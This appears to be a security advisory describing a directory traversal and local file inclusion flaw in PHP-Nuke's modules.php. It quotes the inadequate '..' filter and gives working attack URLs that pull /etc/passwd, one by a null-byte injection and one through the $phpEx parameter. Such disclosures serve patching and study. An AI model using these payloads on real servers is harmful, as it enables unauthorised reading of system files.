Vulnerabilities :
*****************

File disclosure :
=================

By GET or POST request remote attacker can make specially crafted parameter to see the fil
es on the victim server. 
In our case in php.ini the magic_quotes_gpc must be off.

Environment :
------------- 
php.ini: magic_quotes_gpc = Off

The problem exist in modules.php so first let's see the source code of this file.

Original code from modules.php :
---------------------------------
...
if (!isset($file) OR $file != $_REQUEST['file']) $file="index";
if (stripos_clone($file,"..") OR stripos_clone($mop,"..")) die("You are so cool..
.");
....
-----------------------------------

Here we can see that there is function stripos_clone(); to filter variable $file, $mop to 
detect and prevent 
Remote Directory Traversal - Local file include. So when user set variable $file, $mop the
function start filter ".." .
Ok lets see the function stripos_clone(); code in mainfile.php :
--------
// We want to use the function stripos,
// but thats only available since PHP5.
// So we cloned the function...
if(!function_exists('stripos')) {
function stripos_clone($haystack, $needle, $offset=0) {
return strpos(strtoupper($haystack), strtoupper($needle), $offset);
}
} else {
// But when this is PHP5, we use the original function 
function stripos_clone($haystack, $needle, $offset=0) {
return stripos($haystack, $needle, $offset=0);
}
}
--------

Now lets do some test : 

http://victim/[nuke_dir]/modules.php?name=Search&file=index/../

After this we will see the message : 
------------------------------------
You are so cool...
------------------------------------

Everything goes fine but when we try :

http://victim/[nuke_dir]/modules.php?name=Search&file=../../../../../../../../../etc/passw
d%00

Then we get /etc/passwd from server .

Another method to see file when server have magic_quotes_gpc = On .

Environment :
------------- 
php.ini: magic_quotes_gpc = On

Some phpnuke version do not include all phpbb forum. When in phpnuke directory is missing 
file extension.inc
in modules/Forums/ then we can use variable $phpEx to include file from server . 

Example :

http://victim/[nuke_dir]/modules.php?name=Search&file=../Forums/viewtopic&phpEx=../../../.
./../../etc/passwd
